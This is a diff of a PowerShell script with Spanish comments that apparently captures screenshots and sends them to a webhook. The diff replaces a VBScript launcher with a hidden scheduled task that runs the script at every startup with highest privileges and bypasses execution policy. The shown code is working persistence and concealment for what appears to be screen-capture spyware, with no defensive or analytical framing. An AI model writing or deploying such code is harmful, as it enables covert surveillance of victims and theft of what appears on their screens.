@@ -4,7 +4,7 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected00..."
+    Write-Host "Shortened Webhook URL Detected11..."
     $hookurl = (irm $hookurl).url
 }
 
@@ -20,21 +20,11 @@ if (-not $scriptDirectory) {
     exit
 }
 
-# Obtener la ruta del archivo de VBScript en la misma ubicación que el script de PowerShell
-$vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
-
-# Crear el archivo VBScript si no existe
-if (-not (Test-Path $vbsScriptPath)) {
-@"
-Set WshShell = CreateObject(""WScript.Shell"")
-WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.ScriptFullName)' "", 0, false
-"@ | Set-Content -Path $vbsScriptPath -Encoding ASCII
-}
-
 # Crear la tarea programada para iniciar el script al iniciar Windows
-$taskAction = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument $vbsScriptPath
-$taskTrigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName 'ScriptStartupTask' -Action $taskAction -Trigger $taskTrigger -RunLevel Highest
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$settings = New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName "ScriptStartupTask" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest
 
 do {
     $Filett = Join-Path -Path $scriptDirectory -ChildPath "SC.png"
@@ -69,9 +59,6 @@ do {
 
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
-        # Ejecutar el archivo de VBScript
-        Start-Process wscript.exe -ArgumentList $vbsScriptPath
-
         # Reiniciar contador de imágenes
         $a = 0
     }
